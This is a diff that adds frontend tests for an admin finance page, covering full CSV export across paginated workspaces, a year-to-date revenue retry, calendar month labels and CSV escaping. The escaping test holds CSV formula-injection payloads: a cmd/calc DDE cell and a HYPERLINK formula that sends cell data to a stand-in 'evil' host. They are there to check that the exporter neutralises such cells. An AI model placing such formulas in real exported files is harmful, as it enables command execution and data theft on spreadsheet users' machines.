@@ -271,6 +271,45 @@ describe('Accounts tab', () => {
     await waitFor(() => expect(accountsCalls().some((c) => c.url.searchParams.get('currency') === 'TRY')).toBe(true));
   });
 
+  it('the CSV holds every matching workspace, not the page on screen', async () => {
+    const TOTAL = 230;
+    const rowAt = (i: number) => accountRow({ workspace_id: `00000000-0000-4000-8000-${String(i).padStart(12, '0')}`, name: `WS ${i}` });
+    on('GET', /^\/accounts$/, (url) => {
+      const page = Number(url.searchParams.get('page') ?? 1);
+      const size = Number(url.searchParams.get('pageSize') ?? 25);
+      const from = (page - 1) * size;
+      const items = Array.from({ length: Math.max(0, Math.min(size, TOTAL - from)) }, (_, k) => rowAt(from + k));
+      return { body: { edition: 'international', currencies: ['USD'], total: TOTAL, page, pageSize: size, items } };
+    });
+    const blobs: Blob[] = [];
+    const urlApi = URL as unknown as { createObjectURL?: unknown; revokeObjectURL?: unknown };
+    const saved = { create: urlApi.createObjectURL, revoke: urlApi.revokeObjectURL };
+    urlApi.createObjectURL = vi.fn((b: Blob) => { blobs.push(b); return 'blob:csv'; });
+    urlApi.revokeObjectURL = vi.fn();
+    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
+    try {
+      renderWith(<AccountsTab />);
+      await screen.findByText('WS 0');
+      fireEvent.click(screen.getByRole('button', { name: 'CSV' }));
+      await waitFor(() => expect(blobs).toHaveLength(1));
+      const text = await new Promise<string>((resolve) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(String(reader.result));
+        reader.readAsText(blobs[0]);
+      });
+      const lines = text.replace(/^\uFEFF/, '').split('\r\n');
+      expect(lines).toHaveLength(1 + TOTAL);
+      expect(lines.at(-1)).toContain('WS 229');
+      const pages = accountsCalls().filter((c) => c.url.searchParams.get('pageSize') === '100');
+      expect(pages.map((c) => c.url.searchParams.get('page'))).toEqual(['1', '2', '3']);
+      expect(pages.every((c) => c.url.searchParams.get('filter') === 'with_account' && c.url.searchParams.get('sort') === 'balance_desc')).toBe(true);
+    } finally {
+      urlApi.createObjectURL = saved.create;
+      urlApi.revokeObjectURL = saved.revoke;
+      click.mockRestore();
+    }
+  });
+
   it('shows a workspace without an account and opens the detail on click', async () => {
     on('GET', /^\/accounts$/, () => ({
       body: { edition: 'international', currencies: ['USD'], total: 1, page: 1, pageSize: 25, items: [accountRow({ has_account: false, currency: null, balance_minor: 0, card_status: null, next_period_prepaid_minor: null })] },
@@ -467,6 +506,31 @@ describe('Revenue tab', () => {
     expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.chargeback)).toBeInTheDocument();
     expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.paddle)).toBeInTheDocument();
     expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.refundMonth)).toBeInTheDocument();
+    expect(screen.getByText(fa.admin.simpleBilling.revenue.footnote.purged)).toBeInTheDocument();
+  });
+
+  it('year to date never falls back to a shorter report: while the 12-month report fails it says so, with a retry', async () => {
+    let failYear = true;
+    on('GET', /^\/revenue$/, (url) => {
+      if (url.searchParams.get('months') === '12' && failYear) return { status: 500, body: { error: 'TIMEOUT' } };
+      return {
+        body: report('international', ['USD'], [
+          // January is in this year but outside a 6-month report.
+          { day: '2026-01-15', metric: 'payment' as const, currency: 'USD', provider: 'paddle', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 70000, tax_minor: 0, net_minor: 70000 },
+          { day: '2026-10-02', metric: 'payment' as const, currency: 'USD', provider: 'paddle', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 2000, tax_minor: 0, net_minor: 2000 },
+        ].filter((d) => url.searchParams.get('months') === '12' || d.day >= '2026-05-01')),
+      };
+    });
+    renderWith(<RevenueTab />, '/admin/finance?tab=revenue');
+    await screen.findByText(en.admin.simpleBilling.common.loadFailed);
+    await choose(screen.getByLabelText(en.admin.simpleBilling.revenue.months), 'Last 6 months');
+    const usd = await screen.findByTestId('revenue-section-USD');
+    const failed = within(usd).getByTestId('revenue-ytd-failed-USD');
+    expect(failed.textContent).toContain(en.admin.simpleBilling.revenue.ytdFailed);
+    failYear = false;
+    fireEvent.click(within(failed).getByRole('button', { name: en.admin.simpleBilling.common.retry }));
+    // The real year to date: January's $700 plus October's $20.
+    await waitFor(() => expect(within(usd).getAllByText('$720.00').length).toBeGreaterThan(0));
   });
 
   it('has one section per currency abroad, Gregorian months, and the include-test switch', async () => {
@@ -521,6 +585,13 @@ describe('finance helpers', () => {
     return typeof v === 'string' ? v : k;
   }) as Parameters<typeof ui.monthLabel>[3];
 
+  it('short chart labels carry the year in both calendars (a 24-month chart has each month twice)', () => {
+    expect(ui.shortMonthLabel('1404-07', 'jalali', 'en', t)).toBe('Mehr 04');
+    expect(ui.shortMonthLabel('1405-07', 'jalali', 'en', t)).toBe('Mehr 05');
+    expect(ui.shortMonthLabel('1405-07', 'jalali', 'fa', t)).toBe('Mehr ۰۵');
+    expect(ui.shortMonthLabel('2026-10', 'gregorian', 'en', t)).toBe('Oct 26');
+  });
+
   it('names months in both calendars', () => {
     expect(ui.monthLabel('1405-07', 'jalali', 'en', t)).toBe('Mehr 1405');
     expect(ui.monthLabel('1405-01', 'jalali', 'en', t)).toBe('Farvardin 1405');
@@ -545,6 +616,14 @@ describe('finance helpers', () => {
     ]));
     expect(rows[0][0]).toBe('month');
     expect(rows.at(-1)).toEqual(['1405-07', 'IRR', 'Toman', 1, 109_000, 9_000, 100_000, 0, 0, 0, 0, 100_000]);
+    // Notes follow the data after an empty row.
+    const noted = ui.revenueCsvRows(report('iran', ['IRR']), ['Purged workspaces are not included.']);
+    expect(noted.slice(-2)).toEqual([[], ['# Purged workspaces are not included.']]);
+  });
+
+  it('neutralises text cells that start with "-" and a digit (a formula to a spreadsheet); numbers stay numbers', () => {
+    expect(ui.toCsv([["-1+cmd|' /C calc'!A0", '-2+HYPERLINK("https://evil/?"&B2,"x")', -5, '-3']]))
+      .toBe(`'-1+cmd|' /C calc'!A0,"'-2+HYPERLINK(""https://evil/?""&B2,""x"")",-5,'-3`);
   });
 
   it('marks period ends within a week', () => {
